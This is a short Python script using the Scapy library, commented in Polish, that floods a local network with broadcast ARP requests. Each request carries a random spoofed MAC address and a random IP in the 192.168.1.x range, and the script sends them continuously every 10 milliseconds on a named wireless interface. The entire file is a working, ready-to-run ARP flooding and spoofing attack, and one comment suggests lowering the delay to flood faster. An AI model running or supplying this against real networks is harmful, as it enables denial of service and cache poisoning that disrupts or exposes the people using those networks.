from scapy.all import ARP, Ether, sendp, RandMAC
import random
import time

iface = "MediaTek Wi-Fi 6E MT7902 Wireless LAN Card"  # lub "eth0" w zależności od interfejsu

def flood_arp():
    try:
        while True:
            # losowy adres IP w podsieci
            fake_ip = f"192.168.1.{random.randint(2, 254)}"
            # losowy MAC
            fake_mac = RandMAC()

            pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src=fake_mac) / ARP(
                op=1,               # "who has" (request)
                psrc=fake_ip,
                pdst=fake_ip,
                hwsrc=fake_mac
            )

            sendp(pkt, iface=iface, verbose=False)
            print(f"Sent fake ARP: {fake_ip} is-at {fake_mac}")
            time.sleep(0.01)  # Możesz to zmniejszyć, żeby było szybciej

    except KeyboardInterrupt:
        print("\n[!] Przerwano floodowanie.")

flood_arp()
